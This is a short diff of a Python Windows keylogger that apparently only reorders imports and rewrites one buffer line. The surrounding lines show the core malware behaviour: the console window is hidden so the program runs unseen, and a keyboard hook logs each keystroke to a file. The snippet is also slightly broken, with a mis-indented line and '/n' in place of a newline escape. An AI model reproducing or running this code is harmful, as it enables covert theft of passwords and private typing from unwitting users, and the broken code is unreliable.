@@ -1,8 +1,9 @@
-import win32api
-import win32console
-import win32gui
 import pythoncom
 import pyHook
+import win32api
+import win32gui
+import win32console
+
   
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
@@ -20,7 +21,7 @@ def OnKeyboardEvent(event):
         keylogs = chr(event.Ascii)
         if event.Ascii == 13:
         keylogs = '/n'
-        buffer += keylogs
+        buffer = buffer + keylogs
         f.write(buffer)
         f.close()
 
